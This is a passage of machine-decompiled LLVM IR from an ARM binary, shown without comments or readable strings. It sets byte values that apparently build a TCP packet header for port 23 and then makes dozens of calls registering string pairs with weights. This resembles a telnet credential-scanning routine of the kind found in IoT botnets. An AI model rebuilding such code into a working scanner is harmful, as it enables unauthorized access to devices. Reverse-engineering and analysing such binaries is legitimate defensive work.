  store i8 69, i8* bitcast (i8** @global_var_1ec40.201 to i8*), align 4
  store i8 40, i8* bitcast (i32* @global_var_1ec43.202 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1ec42.203 to i8*), align 4
  %v0_10a9c = call i32 @function_fe60()
  %v1_10a9c = trunc i32 %v0_10a9c to i8
  store i32 %v0_10a9c, i32* %r0.global-to-local, align 4
  %v4_10aa4 = sext i8 %v5_10a50.le to i32
  %v3_10aa8 = load i8, i8* @global_var_1ec60.206, align 1
  store i32 ptrtoint (i8** @global_var_1ec40.201 to i32), i32* %lr.global-to-local, align 4
  %v3_10ab0228 = udiv i32 %v4_10aa4, 256
  store i8 64, i8* bitcast (i32* @global_var_1ec48.207 to i8*), align 4
  %v2_10abc = and i32 %v0_10a9c, 128
  %v3_10abc = icmp ne i32 %v2_10abc, 0
  store i1 %v3_10abc, i1* %cpsr_c.global-to-local, align 1
  %v4_10abc227 = udiv i32 %v0_10a9c, 256
  store i32 ptrtoint (i32* @global_var_1ec54.205 to i32), i32* %r3.global-to-local, align 4
  %tmp = urem i8 %v3_10aa8, 16
  %v1_10ac4 = zext i8 %tmp to i32
  store i32 6, i32* @r6, align 4
  %v1_10acc = trunc i32 %v4_10abc227 to i8
  store i8 %v1_10acc, i8* bitcast (i32* @global_var_1ec45.208 to i8*), align 4
  %v1_10ad0 = or i32 %v1_10ac4, 80
  store i32 %v1_10ad0, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r2.global-to-local, align 4
  %v1_10ad8 = trunc i32 %v1_10ad0 to i8
  store i8 %v1_10ad8, i8* @global_var_1ec60.206, align 1
  %v1_10adc = trunc i32 %v3_10ab0228 to i8
  store i8 %v1_10adc, i8* bitcast (i32* @global_var_1ec55.209 to i8*), align 4
  store i8 23, i8* bitcast (i32* @global_var_1ec57.210 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_1ec49.211 to i8*), align 4
  store i32 %v4_10aa4, i32* %ip.global-to-local, align 4
  store i8 %v1_10a9c, i8* bitcast (i32* @global_var_1ec44.212 to i8*), align 4
  store i8 %v5_10a50.le, i8* bitcast (i32* @global_var_1ec54.205 to i8*), align 4
  %v0_10af4 = load i32, i32* @r5, align 4
  %v1_10af4 = trunc i32 %v0_10af4 to i8
  store i8 %v1_10af4, i8* bitcast (i32* @global_var_1ec56.213 to i8*), align 4
  %v0_10af8 = call i32 @function_fe60()
  %v1_10af8 = trunc i32 %v0_10af8 to i8
  store i32 ptrtoint (i32* @global_var_1ec54.205 to i32), i32* @lr, align 4
  %v3_10b00 = load i8, i8* @global_var_1ec61.214, align 1
  %v4_10b00 = zext i8 %v3_10b00 to i32
  %v2_10b04 = and i32 %v0_10af8, 128
  %v3_10b04 = icmp ne i32 %v2_10b04, 0
  store i1 %v3_10b04, i1* %cpsr_c.global-to-local, align 1
  %v4_10b04 = sdiv i32 %v0_10af8, 256
  store i32 %v4_10b04, i32* %ip.global-to-local, align 4
  %v1_10b08 = or i32 %v4_10b00, 2
  store i32 %v1_10b08, i32* %r3.global-to-local, align 4
  store i32 %v0_10af8, i32* @r4, align 4
  %v1_10b10 = trunc i32 %v4_10b04 to i8
  store i8 %v1_10b10, i8* bitcast (i32* @global_var_1ec63.215 to i8*), align 4
  %v1_10b14 = trunc i32 %v1_10b08 to i8
  store i8 %v1_10b14, i8* @global_var_1ec61.214, align 1
  store i8 %v1_10af8, i8* bitcast (i32* @global_var_1ec62.216 to i8*), align 4
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f78.220 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_10b28 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint (i32* @global_var_15f78.220 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f78.220 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10b38 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint (i32* @global_var_15f78.220 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16044.224 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_10b48 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint (i32* @global_var_16044.224 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1604c.226 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_10b58 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint ([6 x i8]* @global_var_1604c.226 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_10b68 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r1.global-to-local, align 4
  %v5_10b78 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16054.228 to i32), i32* %r1.global-to-local, align 4
  %v0_10b84 = load i32, i32* @r6, align 4
  store i32 %v0_10b84, i32* %r2.global-to-local, align 4
  %v4_10b88 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint (i32* @global_var_16054.228 to i32), i32 %v0_10b84)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1605c.230 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10b98 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint ([8 x i8]* @global_var_1605c.230 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_16064.232 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10ba8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint ([9 x i8]* @global_var_16064.232 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16070.234 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10bb8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint (i32* @global_var_16070.234 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16078.236 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10bc8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint (i32* @global_var_16078.236 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_16080.238 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f78.220 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_10bd8 = call i32 @function_10778(i32 ptrtoint ([8 x i8]* @global_var_16080.238 to i32), i32 ptrtoint (i32* @global_var_15f78.220 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_16088.240 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_16088.240 to i32), i32* %r1.global-to-local, align 4
  %v5_10be8 = call i32 @function_10778(i32 ptrtoint ([8 x i8]* @global_var_16088.240 to i32), i32 ptrtoint ([8 x i8]* @global_var_16088.240 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_16088.240 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_10bf8 = call i32 @function_10778(i32 ptrtoint ([8 x i8]* @global_var_16088.240 to i32), i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_16088.240 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16090.242 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_10c08 = call i32 @function_10778(i32 ptrtoint ([8 x i8]* @global_var_16088.240 to i32), i32 ptrtoint (i32* @global_var_16090.242 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_16088.240 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16070.234 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_10c18 = call i32 @function_10778(i32 ptrtoint ([8 x i8]* @global_var_16088.240 to i32), i32 ptrtoint (i32* @global_var_16070.234 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_16088.240 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_10c28 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint ([8 x i8]* @global_var_16088.240 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_16098.244 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_10c38 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint ([9 x i8]* @global_var_16098.244 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r1.global-to-local, align 4
  %v5_10c48 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_160a4.246 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_10c58 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint (i32* @global_var_160a4.246 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_160ac.248 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f78.220 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_10c68 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_160ac.248 to i32), i32 ptrtoint (i32* @global_var_15f78.220 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_160ac.248 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_160ac.248 to i32), i32* %r1.global-to-local, align 4
  %v5_10c78 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_160ac.248 to i32), i32 ptrtoint ([5 x i8]* @global_var_160ac.248 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_160ac.248 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16070.234 to i32), i32* %r1.global-to-local, align 4
  %v0_10c84 = load i32, i32* @r6, align 4
  store i32 %v0_10c84, i32* %r2.global-to-local, align 4
  %v4_10c88 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_160ac.248 to i32), i32 ptrtoint (i32* @global_var_16070.234 to i32), i32 %v0_10c84)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_160b4.250 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_10c98 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint (i32* @global_var_160b4.250 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16158.252 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_10ca8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint (i32* @global_var_16158.252 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_160c0.254 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_10cb8 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint ([9 x i8]* @global_var_160c0.254 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16158.252 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_10cc8 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint (i32* @global_var_16158.252 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_160cc.256 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_10cd8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint (i32* @global_var_160cc.256 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_16098.244 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_10ce8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint ([9 x i8]* @global_var_16098.244 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16090.242 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_10cf8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint (i32* @global_var_16090.242 to i32), i32 4)
  store i32 ptrtoint ([14 x i8]* @global_var_160d4.258 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f78.220 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_10d08 = call i32 @function_10778(i32 ptrtoint ([14 x i8]* @global_var_160d4.258 to i32), i32 ptrtoint (i32* @global_var_15f78.220 to i32), i32 13)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_160e4.260 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_10d18 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint ([8 x i8]* @global_var_160e4.260 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_160ec.262 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f78.220 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10d28 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_160ec.262 to i32), i32 ptrtoint (i32* @global_var_15f78.220 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_160ec.262 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_160ec.262 to i32), i32* %r1.global-to-local, align 4
  %v5_10d38 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_160ec.262 to i32), i32 ptrtoint ([6 x i8]* @global_var_160ec.262 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_160ec.262 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_160a4.246 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10d48 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_160ec.262 to i32), i32 ptrtoint (i32* @global_var_160a4.246 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_160ec.262 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16070.234 to i32), i32* %r1.global-to-local, align 4
  %v0_10d54 = load i32, i32* @r6, align 4
  store i32 %v0_10d54, i32* %r2.global-to-local, align 4
  %v4_10d58 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_160ec.262 to i32), i32 ptrtoint (i32* @global_var_16070.234 to i32), i32 %v0_10d54)
  store i32 ptrtoint ([5 x i8]* @global_var_160f4.264 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_160f4.264 to i32), i32* %r1.global-to-local, align 4
  %v5_10d68 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_160f4.264 to i32), i32 ptrtoint ([5 x i8]* @global_var_160f4.264 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_160fc.266 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10d78 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint (i32* @global_var_160fc.266 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_160fc.266 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10d88 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint (i32* @global_var_160fc.266 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16108.268 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10d98 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint (i32* @global_var_16108.268 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_16110.270 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10da8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint ([6 x i8]* @global_var_16110.270 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_16118.272 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_10db8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint ([5 x i8]* @global_var_16118.272 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_16120.274 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_10dc8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint ([6 x i8]* @global_var_16120.274 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16128.276 to i32), i32* %r1.global-to-local, align 4
  %v0_10dd4 = load i32, i32* @r6, align 4
  store i32 %v0_10dd4, i32* %r2.global-to-local, align 4
  %v4_10dd8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint (i32* @global_var_16128.276 to i32), i32 %v0_10dd4)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16090.242 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10de8 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint (i32* @global_var_16090.242 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_160a4.246 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10df8 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint (i32* @global_var_160a4.246 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16070.234 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10e08 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint (i32* @global_var_16070.234 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16130.278 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10e18 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint (i32* @global_var_16130.278 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16140.280 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_10e28 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint (i32* @global_var_16140.280 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1614c.282 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_10e38 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint ([5 x i8]* @global_var_1614c.282 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_16068.284 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10e48 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint ([5 x i8]* @global_var_16068.284 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16154.286 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_10e58 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint (i32* @global_var_16154.286 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16160.288 to i32), i32* %r1.global-to-local, align 4
  %v0_10e64 = load i32, i32* @r6, align 4
  store i32 %v0_10e64, i32* %r2.global-to-local, align 4
  %v4_10e68 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint (i32* @global_var_16160.288 to i32), i32 %v0_10e64)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16168.290 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10e78 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint (i32* @global_var_16168.290 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1616c.292 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_10e88 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint (i32* @global_var_1616c.292 to i32), i32 7)
  store i32 ptrtoint ([4 x i8]* @global_var_16174.294 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f78.220 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_10e98 = call i32 @function_10778(i32 ptrtoint ([4 x i8]* @global_var_16174.294 to i32), i32 ptrtoint (i32* @global_var_15f78.220 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16178.296 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_10ea8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint (i32* @global_var_16178.296 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_16184.298 to i32), i32* %r1.global-to-local, align 4
  %v0_10eb4 = load i32, i32* @r6, align 4
  store i32 %v0_10eb4, i32* %r2.global-to-local, align 4
  %v5_10eb8 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint ([7 x i8]* @global_var_16184.298 to i32), i32 %v0_10eb4)
  store i32 ptrtoint ([7 x i8]* @global_var_1618c.300 to i32), i32* %r0.global-to-local, align 4
  %v0_10ec0 = load i32, i32* @r6, align 4
  store i32 %v0_10ec0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1618c.300 to i32), i32* %r1.global-to-local, align 4
  %v5_10ec8 = call i32 @function_10778(i32 ptrtoint ([7 x i8]* @global_var_1618c.300 to i32), i32 ptrtoint ([7 x i8]* @global_var_1618c.300 to i32), i32 %v0_10ec0)
  store i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16194.302 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_10ed8 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), i32 ptrtoint (i32* @global_var_16194.302 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16194.302 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
